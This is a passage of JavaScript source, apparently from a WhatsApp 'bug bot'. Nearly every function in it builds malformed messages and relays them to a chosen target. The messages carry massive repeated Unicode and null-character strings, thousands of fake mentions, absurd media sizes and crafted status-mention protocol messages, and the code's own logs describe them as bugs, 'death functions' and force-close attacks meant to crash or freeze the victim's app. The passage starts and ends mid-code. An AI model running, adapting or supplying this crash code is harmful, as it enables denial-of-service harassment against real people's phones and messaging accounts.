            forwardingScore: 888,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "111111111111@s.whatsapp.net",
            },
            quotedMessage: {
              callLogMessage: {
                isVideo: true,
                callOutCome: 1,
                duration: 135,
                participantIds: [],
              },
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "999999999@newsletter",
              newsletterName: "Bokep Mas?",
              contentType: "UPDATE",
              serverMessageId: 2,
             }
           }
         }
       };
    const Junzz = {
     interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo="),
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec="),
                        fileName: "BlankFile" + "𑜦𑜠".repeat(25000),
                        fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo="),
                        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1726867151",
                        contactVcard: false,
                        jpegThumbnail: null,
                    }
                },
                body: { text: "ꦾ".repeat(10000) },
                contextInfo: {
                    stanzaId: "metawai_id",
                    forwardingScore: 999,
                    participant: target,
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                }
            }
        };
    for (const msg of [msg, DelayIn, msg2, Junzz]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.red(`SEMESTA - JAYA SUCCES SENDING BULLDO BLANK ${target}`));
  }
}

async function nxlay(target) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " ─Nxpeɔt¡on`r4Ldz. ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: ".raldz",
            paramsJson: "\u9999".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "\n",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  for (let x = 0; x < 50; x++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target } 
      }
    )
  };

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          type: 25
        },
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: " ─Nxpeɔt¡on`r4Ldz. " },
            content: undefined
          }
        ]
      }
    }
  }, {});
}

async function wolkerback(target) {
  try {
    const biminvis = "\u2063".repeat(4000);
    const salsainvis = "\u300B".repeat(3000);

    const datamsg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "131338822@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "@s.whatsapp.net"
                )
              ]
            },
            body: {
              nativeFlowMessage: {
                messageParamsJson: "",
                messageVersion: 3,
                buttons: [
                  {
                    title: "ABIM VS OTAX",
                    text: "SALSA VS ABIM",
                    format: "DEFAULT"
                  }
                ],
                nativeFlowMessage2: {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(192000) + biminvis
                }
              }
            },
            name: "galaxy_message",
            buttonParamsJson: "\u0005".repeat(92000) + salsainvis
          }
        }
      }
    };

    const msg6 = {
      videoMessage: {
        url: "https://example.com/video.mp4",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/example",
        mediaKeyTimestamp: "1748276788",
        contextInfo: {
          isSampled: true,
          mentionedJid:
            typeof mentionedList !== "undefined" ? mentionedList : []
        },
        ID: "68884987",
        uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
        buffer:
          "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
        sid: "5e03e0",
        SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
        ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
        mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc="
      }
    };

    const datamsg2 = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath:
          "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
          ID: "68884987",
          stanzaId: "1234567890ABCDEF"
        },
        uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
        buffer:
          "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
        sid: "5e03e0",
        SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
        ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
        mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc="
      }
    };

    const datamsg3 = [
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                xternalAdReply: {
                  title: "Abimofficial",
                  text: abimsalsa
                }
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "view_product",
                    buttonParamsJson:
                      "\u0005".repeat(5000) + salsainvis
                  },
                  {
                    name: "address_message",
                    buttonParamsJson:
                      "\u0005".repeat(5000) + salsainvis
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson:
                      "\u0005".repeat(6000) + salsainvis
                  }
                ]
              },
              extendedTextMessage: {
                text: "{".repeat(9000),
                contextInfo: {
                  mentionedJid: Array.from(
                    { length: 2000 },
                    (_, i) => `1${i}@s.whatsapp.net`
                  )
                }
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            }
          }
        }
      }
    ];

    for (const msg of [datamsg1, datamsg2, datamsg3]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });

      console.log(
        `Wolker Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`
      );
    }
  } catch (e) {
    console.error(e);
  }
}

async function testPayment(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        paymentMessage: {
          body: { text: "TestCelah" + "ꦽ".repeat(25000) + "ꦽ".repeat(5000) },
           nativeFlowMessage: {
               buttons: [
                 {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000),
                    version: 4,
                    flow_cta_version: "4",
                   }),
                 },
                 {
                    name: "send_location",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000),
                    version: 4,
                    flow_cta_version: "4",
                   }),
                 },
                 {
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000),
                    version: 4,
                    flow_cta_version: "4",
                   }),
                 },
               ],
             },
             contextInfo: {
            remoteJid: "X",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Date.now() + 1814400000
                 },
               },
             },
             quotedMessage: {
              locationMessage: {
               degreesLatitude: 999999999,
                 degreesLongitude: -999999999,
                 name: '{'.repeat(15000),
                 address: '{'.repeat(15000)
               },
             },
           },
         },
       },
     },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
  
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(5000),
        inviteExpiration: "99999999999",
        groupName:
          "༑ ▾Bang Bang Bang Bang..▾" + "ꦾ".repeat(5000),
        caption:
          "༑ ▾Bang Bang Bang..▾" + "ꦾ".repeat(5000),
        body: {
          text:
            "\u200B" +
            "ោ៝".repeat(2500) +
            "ꦾ".repeat(25000) +
            "ꦽ".repeat(5000),
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
  
  await sock.relayMessage(target, {
    remoteJid: "X",
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: Math.floor(Math.random() * 3) + 1,
          expiryTimestamp: Date.now() + 1814400000
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
  
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "#Marga Lolipop" + "ꦽ".repeat(25000),
          jpegThumbnail: "",
          caption: "#Wajib Join Marga Lolipop" + "ꦽ".repeat(15000),
          inviteExpiration: Date.now() + 1814400000, 
        },
      },
    },
  },
  {
    messageId: null,
    participant: { jid: target },
  }
);

  console.log(chalk.red(`Succes Send Death Function To ${target}`));
} 
         
async function secretfunct(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function InVisibleX1(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙕𐎟𑆻",
                    footerText: "𝘼𝙍𝙂𝘼 𝙊𝙁𝙁 ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function Force1Msg(sock, target) {
try {
let message = {
interactiveMessage: {
body: { text: "dia kemana yak" },
nativeFlowMessage: {
buttons: [
{
name: "payment_method",
buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
0x2710
)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
},
],
messageParamsJson: "{}",
},
},
};

const msg = generateWAMessageFromContent(target, message, {});

await sock.relayMessage(target, msg.message, {
additionalNodes: [
{ tag: "biz", attrs: { native_flow_name: "payment_method" } },
],
messageId: msg.key.id,
participant: { jid: target },
userJid: target,
});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: { native_flow_name: "payment_method" },
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined,
},
],
},
],
},
],
});
await new Promise((resolve) => setTimeout(resolve, 500));
console.log("Xmd sending bug forceclose to?? dia? udh ilang");
} catch (err) {
console.log("eror dia ilang bg:", err);
}
}

async function blnkmark(target) {
  try {
    const Abimsukasalsa = "\u0000".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          fakeViewOnceMessage: {
            newsletterName: "I am Abim" + "ꦽ".repeat(1200),
            interactiveResponseMessage: {
              jpegThumbnail: null,
              videoMessage: {
                url: "https://example.com/videomp4",
                buttons: "...",
                body: {
                  text: "Raja - Abim Is" + "ꦽ".repeat(4000)
                },
                buttonsArray: [
                  {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(9000)
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: Abimsukasalsa,
                    url: "https://wa.me/stickerPack/Abim"
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "\u0003".repeat(9500)
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "\u0000".repeat(9900)
                  }
                ],
                nativeFlowResponseMessage: {
                  name: "call_permission_request"
                }
              },
              systemMessageV2: {
                text: "hi kacung" + "ꦽ".repeat(9000)
              },
              interactiveMessage: {
                body: { text: null }
              }
            }
          }
        }
      },
      messageOptions: "custom",
      contextInfo: {
        adReply: {}
      }
    };

    const msg2 = {
      body: { text: "HAI - MARK" },
      nativeFlowMessage: {
        nativeFlowResponseMessage: {
          inviteExpiration: Date.now() + 9999999999,
          buttons: [
            {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(90000)
            }
          ],
          address: "hp kentang tembus 😂" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
        }
      },
      contextInfo: {
        payload: "ꦽꦽꦽ".repeat(300000),
        contextInfo: {
          interactiveMessage: { body: { format: true } }
        },
        participant: "targetjid@s.whatsapp.net",
        mentionedJid: ["0@s.whatsapp.net"]
      },
      fromMe: false,
      caption: null,
      participant: "5521992999999@s.whatsapp.net",
      remoteJid: "0s.whatsapp.net"
    };

    for (const msg of [msg1]) {
      await sock.relayMessage(target, msg, {
        participant: { jid: target },
        messageId: null
      });
    }

    for (const msg of [msg2]) {
      await sock.relayMessage(target, msg, {
        participant: { jid: target },
        messageId: null
      });
    }

    console.log(`🐉 Wolker Your Devices Sending Bug To ${target} successful`);

  } catch (e) {
    console.error(e);
  }
}
        
async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Hades Gaya Bebas 🥺",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function Quero(target) {
  let Verse = {
    extendedTextMessage: {
      title: "ꦾ".repeat(100000),
      text: "ꦾ".repeat(50000),
      contextInfo: {
        mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
        participant: target,
        stanzaId: "Ond",
        remoteJid: target,
        isForwarded: true,
        forwardingScore: 999,
        quotedMessage: {
          interactiveMessage: {
            header: {
              title: "ᴡᴀᴛᴀsʜɪ ᴡᴀ ʏᴜᴛᴀx 🜲",
              subtitle: "ꦾ".repeat(10000),
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(20000)
            },
            footer: {
              text: "ꦾ".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ꦾ".repeat(20000),
                    sections: [
                      {
                        title: "ꦾ".repeat(5000),
                        rows: [
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          },
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          },
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          }
                        ]
                      },
                      {
                        title: "ꦾ".repeat(20000) + "ᴡᴀᴛᴀsʜɪ ᴡᴀ ʏᴜᴛᴀx 🜲",
                        rows: [
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          },
                          { 
                            title: "ᴡᴀᴛᴀsʜɪ ᴡᴀ ʏᴜᴛᴀx 🜲", 
                            description: "\u0000".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          }
                        ]
                      }
                    ]
                  })
                }
              ]
            }
          }
        }
      }
    }
  };
  
  let ExVerse = {
    extendedTextMessage: {
      text: "\u0000".repeat(1000000), 
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }, 
        mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z+1}@s.whatsapp.net`) 
      }
    }
  };
  
  await sock.relayMessage(target, Verse, { 
    statusJidList: [target]
  }) 

await sock.relayMessage(target, ExVerse, { 
    statusJidList: [target]
  }) 
console.log("Succes Send Bug");
}

async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "▾̊𝗫𝘆𝗹𝗲𝗻𝙩-𝗩𝗼𝗹𝘁𝗿𝗮〽️̊⃟҈⃪⃪⃪",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await sock.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await sock.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "▾̊𝗫𝘆𝗹𝗲𝗻𝙩-𝗩𝗼𝗹𝘁𝗿𝗮〽️̊⃟҈⃪⃪⃪" },
                             content: undefined
}
]
}
);
}
}

async function xinvis3(sock, target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                        fileLength: "999999",
                        seconds: 999999,
                        mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                        height: 999999,
                        width: 999999,
                        fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                        directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743742853",
                        contextInfo: {
                            isSampled: true,
                            mentionedJid: [
                                "13135550002@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () =>
                                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                )
                            ]
                        },
                        streamingSidecar:
                            "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                        thumbnailDirectPath:
                            "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        annotations: [
                            {
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "kontol",
                                        songId: "peler",
                                        author: "\u0003".repeat(100),
                                        title: "null",
                                        artworkDirectPath:
                                            "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                        artistAttribution:
                                            "https://www.instagram.com/_u/tamainfinity_",
                                        countryBlocklist: true,
                                        isExplicit: true,
                                        artworkMediaKey:
                                            "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                    }
                                },
